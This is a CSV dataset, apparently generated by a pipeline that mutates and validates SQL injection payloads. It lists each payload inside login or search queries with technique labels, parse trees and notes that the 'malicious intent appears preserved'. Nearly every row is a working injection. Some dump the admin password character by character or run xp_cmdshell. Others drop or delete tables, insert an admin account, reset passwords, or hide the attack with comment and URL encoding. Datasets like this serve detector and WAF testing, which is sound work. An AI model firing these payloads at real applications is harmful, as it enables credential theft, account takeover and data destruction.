q00156,"1' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin')>97 --","SELECT * FROM users WHERE username = '1' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin')>97 --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Ascii"", ""Table"", ""Star"", ""GT"", ""Substring"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00157,"1' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password=CONCAT(REPEAT(CHAR(48), 5), LPAD('', LENGTH(password), CHAR(48)))) --","SELECT * FROM users WHERE username = '1' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password=CONCAT(REPEAT(CHAR(48), 5), LPAD('', LENGTH(password), CHAR(48)))) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""And"", ""Or"", ""Repeat"", ""EQ"", ""Literal"", ""Concat"", ""Length"", ""Select"", ""Identifier"", ""Pad"", ""Where"", ""Chr"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00158,--' OR '1'='1',SELECT * FROM products WHERE name LIKE '%--' OR '1'='1'%',blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00159,'; WAITFOR DELAY '0:0:5' --,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '0:0:5' --%',blind_time,search,1,0,0.0,False,,[],False,static_only,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00160,' AND 1=1; IF (CHAR(87)||CHAR(116)||CHAR(81)||CHAR(115)||CHAR(78)||CHAR(101)||CHAR(116)) IN ('WTSN') BEGIN PRINT CHAR(88); END --,SELECT * FROM products WHERE name LIKE '%' AND 1=1; IF (CHAR(87)||CHAR(116)||CHAR(81)||CHAR(115)||CHAR(78)||CHAR(101)||CHAR(116)) IN ('WTSN') BEGIN PRINT CHAR(88); END --%',blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00161,'; EXECUTE MASTER..xp_cmdshell 'ping -n 10 localhost'; --,SELECT * FROM products WHERE name LIKE '%'; EXECUTE MASTER..xp_cmdshell 'ping -n 10 localhost'; --%',blind_time,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00162,"' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING((SELECT DATABASE()),1,1))>100 THEN SLEEP(5) ELSE 0 END)","SELECT * FROM products WHERE name LIKE '%' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING((SELECT DATABASE()),1,1))>100 THEN SLEEP(5) ELSE 0 END)%'",blind_time,search,1,0,0.0,True,mysql,"[""Case"", ""Or"", ""EQ"", ""If"", ""Anonymous"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""CurrentSchema"", ""From"", ""Ascii"", ""Table"", ""Star"", ""GT"", ""Substring"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00163,"--' UNION ALL SELECT NULL,NULL,NULL,NULL WHERE 1=(SELECT BENCHMARK(500000,COUNT(*)))--","SELECT * FROM products WHERE name LIKE '%--' UNION ALL SELECT NULL,NULL,NULL,NULL WHERE 1=(SELECT BENCHMARK(500000,COUNT(*)))--%'",blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00164,' AND 1=1;(SELECT CASE WHEN LENGTH(password)>5 THEN WAITFOR DELAY '0:0:10' ELSE 0 END FROM users WHERE username='admin')--,SELECT * FROM products WHERE name LIKE '%' AND 1=1;(SELECT CASE WHEN LENGTH(password)>5 THEN WAITFOR DELAY '0:0:10' ELSE 0 END FROM users WHERE username='admin')--%',blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00165,"--' OR 1=(SELECT (CASE WHEN ASCII(SUBSTRING((SELECT user() LIMIT 1),1,1))>70 THEN SLEEP(5) ELSE 0 END))--","SELECT * FROM products WHERE name LIKE '%--' OR 1=(SELECT (CASE WHEN ASCII(SUBSTRING((SELECT user() LIMIT 1),1,1))>70 THEN SLEEP(5) ELSE 0 END))--%'",blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00166,"' AND 1=1; (SELECT (CASE WHEN (SELECT GROUP_CONCAT(username SEPARATOR ',') FROM users) LIKE '%admin%' THEN BENCHMARK(500000,'x'=NULL) ELSE 0 END) --","SELECT * FROM products WHERE name LIKE '%' AND 1=1; (SELECT (CASE WHEN (SELECT GROUP_CONCAT(username SEPARATOR ',') FROM users) LIKE '%admin%' THEN BENCHMARK(500000,'x'=NULL) ELSE 0 END) --%'",blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00167,--' OR 3580=SLEEP(SELECT COUNT(*)FROM information_schema.tables),SELECT * FROM products WHERE name LIKE '%--' OR 3580=SLEEP(SELECT COUNT(*)FROM information_schema.tables)%',blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00168,' AND 1=1; WAITFOR DELAY '0:0:5' UNION SELECT NULL,SELECT * FROM products WHERE name LIKE '%' AND 1=1; WAITFOR DELAY '0:0:5' UNION SELECT NULL%',blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00169,"' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING(@@version,1,1))>100 THEN SLEEP(5) ELSE 0 END)","SELECT * FROM products WHERE name LIKE '%' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING(@@version,1,1))>100 THEN SLEEP(5) ELSE 0 END)%'",blind_time,search,1,0,0.0,True,default,"[""Case"", ""Or"", ""If"", ""Identifier"", ""Star"", ""Anonymous"", ""Literal"", ""Parameter"", ""From"", ""Ascii"", ""Substring"", ""Var"", ""Table"", ""GT"", ""Column"", ""EQ"", ""Subquery"", ""Select"", ""Where""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00202,'; EXEC sp_executesql N'SELECT * FROM sys.objects WHERE type_desc LIKE '%USER%' --,SELECT * FROM users WHERE username = ''; EXEC sp_executesql N'SELECT * FROM sys.objects WHERE type_desc LIKE '%USER%' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,postgres,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00203,"'); INSERT INTO users (username, password) VALUES ('admin', 'admin_pass') --","SELECT * FROM users WHERE username = ''); INSERT INTO users (username, password) VALUES ('admin', 'admin_pass') --' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Schema"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00204,"'; UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) AS T --","SELECT * FROM users WHERE username = ''; UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) AS T --' AND password = 'anything'",stacked_queries,login,1,0,0.0,False,,[],False,static_only,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00205,;-- WAITFOR DELAY '0:0:10' --,SELECT * FROM users WHERE username = ';-- WAITFOR DELAY '0:0:10' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Semicolon""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00206,'; DROP TABLE users --,SELECT * FROM users WHERE username = ''; DROP TABLE users --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Drop"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00207,'); ALTER USER admin IDENTIFIED BY 'new_password' --,SELECT * FROM users WHERE username = ''); ALTER USER admin IDENTIFIED BY 'new_password' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00208,'); CREATE DATABASE attacker_db --,SELECT * FROM users WHERE username = ''); CREATE DATABASE attacker_db --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Create"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00209,'); UPDATE users SET password='hacked' WHERE username='test_user' --,SELECT * FROM users WHERE username = ''); UPDATE users SET password='hacked' WHERE username='test_user' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Update"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00210,'); DELETE FROM logs --,SELECT * FROM users WHERE username = ''); DELETE FROM logs --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Delete"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00211,'; DROP TABLE users; --,SELECT * FROM products WHERE name LIKE '%'; DROP TABLE users; --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Drop"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00212,"' OR 1=1 UNION ALL SELECT NULL, NULL, NULL, NULL--","SELECT * FROM products WHERE name LIKE '%' OR 1=1 UNION ALL SELECT NULL, NULL, NULL, NULL--%'",stacked_queries,search,1,0,0.0,True,default,"[""Or"", ""Null"", ""EQ"", ""Union"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00213,' AND EXISTS(SELECT 1 FROM users WHERE username='admin'); --,SELECT * FROM products WHERE name LIKE '%' AND EXISTS(SELECT 1 FROM users WHERE username='admin'); --%',stacked_queries,search,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00214,"' OR 1=1 /**/ UNION ALL SELECT NULL, NULL, NULL, NULL/**/","SELECT * FROM products WHERE name LIKE '%' OR 1=1 /**/ UNION ALL SELECT NULL, NULL, NULL, NULL/**/%'",stacked_queries,search,1,0,0.0,True,default,"[""Or"", ""Null"", ""EQ"", ""Union"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00215,'; EXEC('DROP TABLE users') --,SELECT * FROM products WHERE name LIKE '%'; EXEC('DROP TABLE users') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00216,'; INSERT INTO logs (message) VALUES ('Injection detected') --,SELECT * FROM products WHERE name LIKE '%'; INSERT INTO logs (message) VALUES ('Injection detected') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Schema"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00217,; SELECT * FROM (SELECT payload FROM (SELECT '--' --' FROM products)),SELECT * FROM products WHERE name LIKE '%; SELECT * FROM (SELECT payload FROM (SELECT '--' --' FROM products))%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00218,'; WAITFOR DELAY '0:0:5'; --,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '0:0:5'; --%',stacked_queries,search,1,0,0.0,False,,[],False,static_only,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00219,'; DECLARE @x VARCHAR(1); SET @x = CAST((SELECT 1) AS VARCHAR); SELECT @x FROM products;,SELECT * FROM products WHERE name LIKE '%'; DECLARE @x VARCHAR(1); SET @x = CAST((SELECT 1) AS VARCHAR); SELECT @x FROM products;%',stacked_queries,search,1,0,0.0,True,postgres,"[""Var"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Parameter"", ""Where"", ""SetItem"", ""From"", ""Set"", ""Table"", ""Cast"", ""Star"", ""DataType"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00220,'; IF (SELECT COUNT(*) FROM products) > 0 BEGIN PRINT 'Injection Successful' END; --,SELECT * FROM products WHERE name LIKE '%'; IF (SELECT COUNT(*) FROM products) > 0 BEGIN PRINT 'Injection Successful' END; --%',stacked_queries,search,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00221,'; EXECUTE('DROP TABLE users') --,SELECT * FROM products WHERE name LIKE '%'; EXECUTE('DROP TABLE users') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00247,' OR '1'='1' --,SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00248,';-- OR 1=1 --,SELECT * FROM users WHERE username = '';-- OR 1=1 --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00249,/*#1*/' OR 'password' LIKE '--' OR 'password' LIKE 'password';,SELECT * FROM users WHERE username = '/*#1*/' OR 'password' LIKE '--' OR 'password' LIKE 'password';' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00250,#1 OR (/**/)password = 'admin'--,SELECT * FROM users WHERE username = '#1 OR (/**/)password = 'admin'--' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,mysql,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00251,1/* OR */' OR username = username; --,SELECT * FROM users WHERE username = '1/* OR */' OR username = username; --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00252,"' OR username IN ('admin', 'root') /*","SELECT * FROM users WHERE username = '' OR username IN ('admin', 'root') /*' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00253,"-- Comment before AND
SELECT * FROM users WHERE username = 'admin' AND /**/ password = 'admin'","SELECT * FROM users WHERE username = '-- Comment before AND
SELECT * FROM users WHERE username = 'admin' AND /**/ password = 'admin'' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00254,"# Case insensitive comment
SELECT * FROM users WHERE username = 'admin' AND # password = 'admin'","SELECT * FROM users WHERE username = '# Case insensitive comment
SELECT * FROM users WHERE username = 'admin' AND # password = 'admin'' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00255,"/**/ Subquery in comment
SELECT * FROM users WHERE username = 'admin' AND (/**/ SELECT COUNT(*) FROM dual ) --","SELECT * FROM users WHERE username = '/**/ Subquery in comment
SELECT * FROM users WHERE username = 'admin' AND (/**/ SELECT COUNT(*) FROM dual ) --' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00256,"; Encoding in comment
SELECT * FROM users WHERE username = 'admin' AND password = 'admin'; --","SELECT * FROM users WHERE username = '; Encoding in comment
SELECT * FROM users WHERE username = 'admin' AND password = 'admin'; --' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00257,"' OR ""password"" LIKE '--'
SELECT * FROM users WHERE username = 'admin' AND ""password"" LIKE '--'","SELECT * FROM users WHERE username = '' OR ""password"" LIKE '--'
SELECT * FROM users WHERE username = 'admin' AND ""password"" LIKE '--'' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00258,"[""SELECT * FROM products WHERE name LIKE '%' AND /**/ 1=1; --""","SELECT * FROM products WHERE name LIKE '%[""SELECT * FROM products WHERE name LIKE '%' AND /**/ 1=1; --""%'",comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Mod"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00259,-- 1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0;,SELECT * FROM products WHERE name LIKE '%-- 1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0;%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00260,/**/ 1'/* SQL Injection */ UNION SELECT password FROM users WHERE username = 'admin' /* SQL Injection */;,SELECT * FROM products WHERE name LIKE '%/**/ 1'/* SQL Injection */ UNION SELECT password FROM users WHERE username = 'admin' /* SQL Injection */;%',comment_obfuscation,search,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00261,1';WAITFOR DELAY '0:0:5'--,SELECT * FROM products WHERE name LIKE '%1';WAITFOR DELAY '0:0:5'--%',comment_obfuscation,search,1,0,0.0,False,,[],False,static_only,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00262,--%'; WAITFOR DELAY '0:0:10' --,SELECT * FROM products WHERE name LIKE '%--%'; WAITFOR DELAY '0:0:10' --%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00263,/*#*/'; INSERT INTO logs VALUES ('attack'); --,SELECT * FROM products WHERE name LIKE '%/*#*/'; INSERT INTO logs VALUES ('attack'); --%',comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00264,'; SELECT name FROM users WHERE id = 1 --,SELECT * FROM products WHERE name LIKE '%'; SELECT name FROM users WHERE id = 1 --%',comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00291,--+1%27+WAITFOR+DELAY+'0:0:5'+AND+1=1--,SELECT * FROM users WHERE username = '--+1%27+WAITFOR+DELAY+'0:0:5'+AND+1=1--' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00292,1%27+LIKE+'a%'+AND+(SELECT+CASE+WHEN+1=1+THEN+CHAR(66)+ELSE+NULL+END+FROM+dual)%2B'a',SELECT * FROM users WHERE username = '1%27+LIKE+'a%'+AND+(SELECT+CASE+WHEN+1=1+THEN+CHAR(66)+ELSE+NULL+END+FROM+dual)%2B'a'' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00293,1'%27+OR+EXISTS(SELECT+*+FROM+information_schema.tables+WHERE+table_name=CHAR(0x62)+and+table_schema=database())--,SELECT * FROM users WHERE username = '1'%27+OR+EXISTS(SELECT+*+FROM+information_schema.tables+WHERE+table_name=CHAR(0x62)+and+table_schema=database())--' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00294,"1'/*%23*/union%20all%20select%20username,%20password%20from%20users--%23","SELECT * FROM users WHERE username = '1'/*%23*/union%20all%20select%20username,%20password%20from%20users--%23' AND password = 'anything'",encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00295,1'or%20password%20in(%20(select%20password%20from%20users%20where%20username='admin'))--%23,SELECT * FROM users WHERE username = '1'or%20password%20in(%20(select%20password%20from%20users%20where%20username='admin'))--%23' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00296,1'and%20exists(select%20*%20from%20users%20where%20username='admin')--%23,SELECT * FROM users WHERE username = '1'and%20exists(select%20*%20from%20users%20where%20username='admin')--%23' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00297,1'and%20password='%23'%'--%23,SELECT * FROM users WHERE username = '1'and%20password='%23'%'--%23' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00298,1' + CHAR(0x23) + ' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '%',SELECT * FROM users WHERE username = '1' + CHAR(0x23) + ' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '%'' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00299,"1'/**/UNION/**/ALL/**/SELECT/**/username,password/**/FROM/**/users/**/--","SELECT * FROM users WHERE username = '1'/**/UNION/**/ALL/**/SELECT/**/username,password/**/FROM/**/users/**/--' AND password = 'anything'",encoding_obfuscation,login,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00300,/*1'*/ WAITFOR DELAY '0:0:5' /*2'*/,SELECT * FROM users WHERE username = '/*1'*/ WAITFOR DELAY '0:0:5' /*2'*/' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00303,%' OR EXISTS(SELECT*FROM users WHERE username='admin')/*,SELECT * FROM products WHERE name LIKE '%%' OR EXISTS(SELECT*FROM users WHERE username='admin')/*%',encoding_obfuscation,search,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00306,"%\' OR 4747 = DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(67)||CHR(79)||CHR(101),5)""","SELECT * FROM products WHERE name LIKE '%%\' OR 4747 = DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(67)||CHR(79)||CHR(101),5)""%'",encoding_obfuscation,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Anonymous"", ""Literal"", ""DPipe"", ""Select"", ""Identifier"", ""Dot"", ""Where"", ""Chr"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00307,"%\' UNION ALL SELECT NULL,NULL,NULL,NULL\""""","SELECT * FROM products WHERE name LIKE '%%\' UNION ALL SELECT NULL,NULL,NULL,NULL\""""%'",encoding_obfuscation,search,1,0,0.0,False,,[],False,static_only,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00308,"%\' AND WAITFOR DELAY '0:0:5'""","SELECT * FROM products WHERE name LIKE '%%\' AND WAITFOR DELAY '0:0:5'""%'",encoding_obfuscation,search,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
